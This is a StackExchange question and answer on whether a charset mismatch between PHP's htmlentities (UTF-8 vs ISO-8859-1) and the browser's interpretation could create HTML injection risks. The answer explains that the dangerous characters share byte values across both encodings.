{"text": "Q:\n\nPHP: if charset mismatches (htmlentities UTF-8) viewed by client as ISO-8859-1 (or vice versa)\n\nShort Question:\nQuestion: Could any security vulnerabilities arise if a server runs htmlentities as UTF-8 but the client views the results as ISO-8859-1?\nAssumption: No vulnerabilities exist when one consistent charset is used\n\nDetailed Question:\nQuestion: Could any security vulnerabilities arise if the server htmlentities a ISO-8859-1 string as UTF-8? (and the client interprets the result as ISO-8859-1?)\n(e.g. $results = htmlentities($iso_8859_1_string, ENT_QUOTES, \"UTF-8\")\nAssuming everything is coded in such a way that no vulnerabilities arise when just one character set encoding is consistently used.  (Ignoring if $results = empty string).\nPerhaps if $iso_8859_1_string could contain any value, the results would be treated as either invalid UTF-8 (and return \"\"), or as valid UTF-8. For valid UTF-8, the UTF-8 sequences would be escaped as expected, but how would the results be viewed on the client interpreting the result as ISO-8859-1?  The characters results in the 0 - 127 range being escaped as expected (same as \"US-ASCII\"), some characters would resolve into html entities and could be displayed as expected. Are there valid UTF-8 characters in the higher 128+ range which do not resolve to html entities?  Would the client just see a bunch of garbled/garbage text/symbols but no characters which would cause the web browser to execute code or switch into a code execution context? (e.g. no tag characters such as '<' '>' symbols)?  (Assuming the $results are put into a \"content context\", and not in an \"attribute value\" or a \"script\" body).\nIs this right line of thinking?\n\nNote: I believe I've already worked out the vice versa case (i.e. if the server htmlentities a UTF-8 string as ISO-8859-1 and the client interprets the result as UTF-8)\n(e.g. htmlentities($utf8_string, ENT_QUOTES, \"ISO-8859-1\"))\nAnswer: My guess is no security vulnerability on the client (for htmlentities as ISO -> client reads as UTF-8) because:\n\nIn ISO-8859-1, characters in the range :\n\n0-127 (US-ASCII): are encoded exactly the same way in UTF-8,\n160 -> 255 in ISO-8859-1 would all be encoded as HTML entities, \nleaving just the 128-159 character range..., but according to Wikipedia's UTF-8 specification, http://en.wikipedia.org/wiki/UTF-8#Description, all UTF-8 bytes that are in the 128+ range are all part of \"multi-byte sequences\" which comprise a \"leading byte\" which is always 192 or higher, and \"continuation bytes\" in the 128+ range.  Thus, the htmlentities($utf8_string, ENT_QUOTES, \"ISO-8859-1\") could not output any \"leading bytes\" needed by UTF-8 to generate valid multi-byte sequences. So any characters in this range would appear in UTF-8 as a ? (i.e. an invalid character) due to not seeing any \"leading byte\".\n\nI think this solves my question for the other direction.\n\nReal-world situation: A PHP 5.3.x server with security backports uses ISO-8859-1 as the default encoding. Starting with PHP 5.4, UTF-8 is the default encoding.  http://php.net/htmlentities. I'm wanting to determining if the code works properly in either an all UTF-8, or all ISO-8859-1 environment, and ensuring there are no automatic security holes caused by encoding mistakes/mismatch.\nI feel like I can rest assured that only usability is affected, but not security in these specific cases.\n\nA:\n\nAs far as I'm aware, there's no security issue.\nThe \"dangerous\" characters in HTML (less-than, greater-than, ampersand, single quote, double quote) all have identical byte values under UTF-8 and ISO-8859-1 (and virtually every other encoding you're likely to encounter, with the exceptions of UTF-16, UTF-32, and EBCDIC).  As a result, escaping them in one encoding will escape them in the other encoding as well.\nThe reason this holds true is that the vast majority of character encodings, including UTF-8 and ISO-8859-1, are \"ASCII plus additional characters\", and the structure of an HTML document only uses characters in the ASCII portion of the encoding.\n\n", "meta": {"pile_set_name": "StackExchange"}}
